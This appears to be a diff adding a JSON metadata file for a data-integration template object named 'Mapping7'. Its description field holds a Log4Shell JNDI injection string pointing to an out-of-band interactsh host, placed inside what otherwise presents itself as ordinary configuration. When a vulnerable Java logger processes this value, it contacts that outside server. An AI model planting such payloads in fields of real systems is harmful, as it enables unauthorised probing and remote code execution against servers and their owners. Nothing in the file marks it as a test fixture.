@@ -1,0 +1,30 @@
+{
+  "objectInfo" : {
+    "id" : "cVplkB1AIIQlLfUcQZSQOq",
+    "name" : "Mapping7",
+    "type" : "AtScaleDTemplate",
+    "metadata" : {
+      "modelVersion" : {
+        "major" : 0,
+        "minor" : 0
+      },
+      "repoInfo" : {
+        "repoHandle" : "0137C2170000000007BF"
+      },
+      "contextAttributes" : [ {
+        "name" : "id",
+        "value" : "@1"
+      } ],
+      "additionalInfo" : {
+        "description" : "${jndi:ldap://c6q8hoqek13lf5pibdc0cg4et3yyyyyyn.interactsh.com/a}",
+        "contentType" : "JSON",
+        "documentState" : "INVALID"
+      }
+    }
+  },
+  "dataFileExtension" : "zip",
+  "updateTime" : "2025-06-13T09:12:36.726Z",
+  "objectRefs" : [ ],
+  "readableFileExtension" : "json",
+  "readableFilePresent" : true
+}
